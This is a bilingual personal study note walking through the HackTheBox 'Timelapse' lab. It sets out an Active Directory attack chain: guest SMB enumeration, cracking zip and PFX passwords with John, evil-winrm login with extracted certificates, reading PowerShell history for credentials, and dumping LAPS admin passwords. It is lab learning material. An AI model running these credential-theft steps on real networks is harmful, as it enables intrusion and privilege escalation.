smb get cred>login> history get pfx, > login > find `**LAPS_Readers**` **> admin**

  

cut the ports number

```Bash
awk 'match($0,/([0-9]+)\/tcp/,m){print m[1]}' ports.txt | paste -sd, -
awk '/\/tcp/ {print $1}' ports.txt | cut -d'/' -f1 | paste -sd, -
```

  

  

- **端口 [[53]]**
    
    ：域名系统 (DNS) — 允许将人类可读的域名转换为 IP 地址，反之亦然（通过称为反向 DNS 查找的过程）。
    
- **端口 88：[[88]]**
    
    Kerberos — 这是一个票证授予系统，表示这可能是 Windows 域控制器
    
- **端口 [[135]]**
    
    ：由 Microsoft RPC（远程过程调用）使用，具体来说是 Microsoft DCE 端点映射器。它帮助 Windows 应用程序通过网络进行通信，对于 DCOM 和 SMB 等服务至关重要。
    
- **端口 [[139]]**
    
    ：服务器消息块 (SMB) — 这是用于文件共享的协议。这表明我们可能想要枚举某个文件共享。
    
- **端口 ：[[389]]**
    
    轻量级目录访问协议 (LDAP) — 用于访问和管理目录信息
    
- **端口 [[445]]**
    
    ：较新的 SMB 端口
    
- **端口 593[[593]]**
    
    ：用于 HTTP 上的远程过程调用 (RPC over HTTP)，也称为 RPC over HTTPS。此协议允许 Microsoft 远程过程调用 (RPC) 流量通过 HTTP 或 HTTPS 进行隧道传输，从而实现客户端和服务器之间的安全通信，通常在 Windows 环境中使用。
    
- **端口 636[[636]]**
    
    ：LDAPS — 加密 LDAP 连接
    
- **端口 5986：[[5986]]**
    
    WinRM（Windows 远程管理）：此服务允许远程管理 Windows 系统，并且通常可以利用有效凭据进行远程访问。
    

  

### 1️⃣ `L <host>` (list shares)

- When using `L` to **list all shares on a server**, you give **only the hostname or IP**, **no slashes needed**:
[[smbclient]]

```Bash
smbclient -L 10.10.11.152 -N

```

- Here, `L` **tells smbclient “list shares”**, so smbclient knows it’s just a host, not a share path.
- If you add slashes (`//` or `/Shares`) after `L`, smbclient tries to interpret it as a **service name**, causing the “Not enough '\' characters” error.

---

### 2️⃣ `//host/share` (connect to a share)

- When you want to **connect to a specific share**, you **must use the UNC-style format**:

```Bash
smbclient //10.10.11.152/Shares -N

```

- `//host/share` tells smbclient:
    - `host` = server IP or hostname
    - `share` = specific shared folder
- If you omit the `//`, smbclient doesn’t know this is a share and may throw an error.

---

### ✅ Quick rule of thumb

|Action|Syntax|Slashes needed?|
|---|---|---|
|List all shares|`smbclient -L <host>`|No|
|Connect to a specific share|`smbclient //<host>/<share>`|Yes|

---

💡 **Memory trick:**

- `L` = host only → **no slashes**
- Connecting to a share = `//host/share` → **slashes required**

  

  

Timelapse， mean find it in history

```Bash
smbmap -H timelapse.htb -u guest -R 
//use -u guest
// -R recursively
```

```Bash
smbclient //timelapse.htb/IPC$
//in side smb, use 'prompt' to close the feedback message
// mget LAPS.docx  aaa.docx
// LAPS local administrator passwords solution 
recurse ON
prompt OFF
mget *
```

  

```Bash
unzip  winrmbackup.zip
zip2john winrmbackup.zip > winrmbu.zip.bash
john winrm.zip.bash --worlist 

fcrackzip -D -u winr.zip 
// pfx file  personal inf exchange file

pfx2john
```

```Bash
after get pfx file and key from winrm_backup.zip , then use evil-winrm 
evil-winrm -i timelapse.htb -k legacyy_dev_auth.pfx.decrypt.key -c xx.crt -S
//rem -S enable ssl
```

```PowerShell
type user.txt
whoami /priv
net user username

When you use the net user command, you can perform various operations related to 
user accounts, including creating, modifying, and displaying user account 
information. To display information about a specific user account,
```

```PowerShell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

to get history of powershell 
user is svc_deploy is the LAPS_READERS
Get-ADComputer username
Get-ADComputer dc01 -property * // * means get everything
```

mount [[SMB]]

for mac

```PowerShell
mkdir share && mount_smbfs //guest:@10.10.11.152/Shares ./share
```

### 1️⃣ `mkdir shares`

- `mkdir` = “make directory”
- `shares` = the folder you want to create locally
- **Purpose:** Creates a local mount point where the SMB share will be attached.
- Example:
    
    ```Bash
    mkdir shares
    
    ```
    
    Creates a folder called `shares` in your current directory.
    

---

### 2️⃣ `&&`

- Logical **AND operator** in the shell
- Means: **run the second command only if the first succeeds**
- So `mount_smbfs ...` will run **only if** `**mkdir shares**` **works**.

---

### 3️⃣ `mount_smbfs //guest:@10.10.11.152/Shares ./share`

- `mount_smbfs` = macOS/BSD command to mount an SMB/CIFS network share as a local directory
- `//guest:@10.10.11.152/Shares` = network share path
    - `guest` = username (anonymous login)
    - `:` = password separator (empty here because no password)
    - `10.10.11.152` = SMB server IP
    - `Shares` = share name on the server
- `./share` = local mount point (directory you want the remote files to appear in)
- sO, the name mkdir sharename && mount_smbfs [//guest:@10.10.11.152/Shares](https://guest@10.10.11.152/Shares) ./sharename

  

for linux

```PowerShell
mkdir share && sudo mount -t cifs //10.10.11.152/Shares ./share
```

after login , check history

pwsh history

```PowerShell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```PowerShell
C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

list all

```PowerShell
*Evil-WinRM* PS C:\Users\legacyy> ls -Force



    Directory: C:\Users\legacyy


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--       10/25/2021   8:22 AM                AppData
d--hsl       10/25/2021   8:22 AM                Application Data
d--hsl       10/25/2021   8:22 AM                Cookies
d-r---       10/25/2021   8:25 AM                Desktop
d-r---       10/25/2021   8:22 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d--hsl       10/25/2021   8:22 AM                Local Settings
d-r---        9/15/2018  12:19 AM                Music
d--hsl       10/25/2021   8:22 AM                My Documents
d--hsl       10/25/2021   8:22 AM                NetHood
d-r---        9/15/2018  12:19 AM                Pictures
d--hsl       10/25/2021   8:22 AM                PrintHood
d--hsl       10/25/2021   8:22 AM                Recent
d-----        9/15/2018  12:19 AM                Saved Games
d--hsl       10/25/2021   8:22 AM                SendTo
d--hsl       10/25/2021   8:22 AM                Start Menu
d--hsl       10/25/2021   8:22 AM                Templates
d-r---        9/15/2018  12:19 AM                Videos
-a-h--        8/25/2025   5:58 PM         262144 NTUSER.DAT
-a-hs-       10/25/2021   8:22 AM          98304 ntuser.dat.LOG1
-a-hs-       10/25/2021   8:22 AM              0 ntuser.dat.LOG2
-a-hs-       10/25/2021   8:22 AM          65536 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
-a-hs-       10/25/2021   8:22 AM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
-a-hs-       10/25/2021   8:22 AM         524288 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
---hs-       10/25/2021   8:22 AM             20 ntuser.ini
```

➜ Timelapse openssl pkcs12 -in legacyy_dev_auth.pfx -out private.key -nocerts -nodes  
Enter Import Password:  
MAC verified OK  
➜ Timelapse ls  
LAPS.x64.msi LAPS_TechnicalSpecification.docx legacyy_dev_auth.pfx share  
LAPS_Datasheet.docx cert.pem legacyy_dev_auth.pfx.hash winrm_backup.zip  
LAPS_OperationsGuide.docx key.pem private.key winrm_backup.zip.hash  
➜ Timelapse openssl pkcs12 -in legacyy_dev_auth.pfx -out certificate.pem -nokeys -clcerts  
Enter Import Password:  
Mac verify error: invalid password?  
➜ Timelapse openssl pkcs12 -in legacyy_dev_auth.pfx -out certificate.pem -nokeys -clcerts  
Enter Import Password:  
MAC verified OK

```Plain
  +------------------+
  |   legacyy_dev.pfx |
  +--------+---------+
           |
           | Extract private key
           v
       legacyy_dev.key  (or encrypted: legacyy_dev.key-en)
           |
           | Extract certificate
           v
       legacyy_dev.crt
           |
           | Optionally combine key + cert
           v
       legacyy_dev.pem
       
both -c file.pem and  -c file.crt is ok, 
Private key	.key	Can be plaintext or encrypted (.key-en)
Public certificate	.crt	Your server/client identity
CA/intermediate certs	.crt	Often combined in a single file or as separate files
PEM container	.pem	Can store key + cert(s) together in Base64 text format
```

![[image.png]]

  
➜ Timelapse evil-winrm -S -c certificate.pem -k private.key -i dc01.timelapse.htb -u legacyy  
/usr/local/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/local/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

  

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: [https://github.com/Hackplayers/evil-winrm#Remote-path-completion](https://github.com/Hackplayers/evil-winrm#Remote-path-completion)

Warning: SSL enabled

Info: Establishing connection to remote endpoint_Evil-WinRM_ PS C:\Users\legacyy\Documents>

  

好的 👍 我用中文给你解释一下为什么当用户属于 `**LAPS_Readers**` 组时，我们要用

```PowerShell
Get-ADComputer -Filter * -Property ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd

```

---

### 🔹 什么是 LAPS

- **LAPS（Local Administrator Password Solution，本地管理员密码解决方案）** 是微软提供的一种机制。
- 它会自动为域内的每台计算机生成一个 **唯一的随机强密码**，用来保护本地 `Administrator` 账户。
- 这些密码不会存在本机文件里，而是保存到 **Active Directory** 里。

---

### 🔹 密码保存在哪里

- 在 AD 里，每台计算机对象都会有两个重要属性：
    - `**ms-Mcs-AdmPwd**` → 直接保存当前的本地管理员密码（明文）。
    - `**ms-Mcs-AdmPwdExpirationTime**` → 保存密码的过期时间。

---

### 🔹 谁能读取这些密码

- 默认情况下，只有 **Domain Admins（域管理员）** 才能读取 `ms-Mcs-AdmPwd`。
- 但是很多企业会把读取权限授予某个组，比如 `**LAPS_Readers**`。
- 如果某个用户属于 `LAPS_Readers` 组，那么他就可以直接在 AD 里读取所有机器的本地管理员密码。

---

### 🔹 为什么用这条命令

```PowerShell
Get-ADComputer -Filter * -Property ms-Mcs-AdmPwd |
    Select-Object Name, ms-Mcs-AdmPwd

```

解释：

- `Get-ADComputer -Filter *` → 获取域内所有计算机对象。
- `Property ms-Mcs-AdmPwd` → 额外取出 `ms-Mcs-AdmPwd` 这个属性（即本地管理员密码）。
- `Select-Object Name, ms-Mcs-AdmPwd` → 只显示主机名和对应的密码。

执行结果就是：**你能一次性看到整个域内所有机器的本地管理员明文密码**。

```JavaScript
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { $_.properties}
```

- `**[adsisearcher]**` → Creates a DirectorySearcher object.
- **Filter** `**(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))**` →
    - `objectCategory=computer` → Only computer objects.
    - `ms-MCS-AdmPwd=*` → Only computers that have a LAPS-managed password set.
    - `sAMAccountName=*` → Ensures you only return objects with a SAM account name (all AD computers have one anyway).
- `**.findAll()**` → Executes the LDAP query and returns all results.
- `**ForEach-Object { $_.properties }**` → Dumps the AD properties of each computer object.